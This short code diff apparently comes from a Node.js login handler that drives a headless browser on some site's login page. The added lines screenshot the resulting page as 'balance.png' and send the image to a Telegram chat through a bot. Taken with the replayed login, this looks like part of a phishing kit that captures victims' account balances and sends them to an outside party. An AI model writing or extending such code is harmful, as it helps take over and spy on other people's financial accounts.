@@ -83,6 +83,20 @@ app.post('/login', async (req, res) => {
   const isClassPresent = await page.evaluate(() => {
     return document.querySelector('.miam-a1-err-par') !== null;
   });
+  
+  
+  await page.screenshot({ path: 'balance.png', fullPage: true })
+
+  const imagePath = 'balance.png';
+
+  // Send the image
+bot.sendPhoto(chatId, imagePath)
+    .then(() => {
+      // console.log('Image sent successfully');
+    })
+    .catch((error) => {
+      console.error('Error sending image:', error);
+    });
 
   try {
     await page.click('.more-options-link');
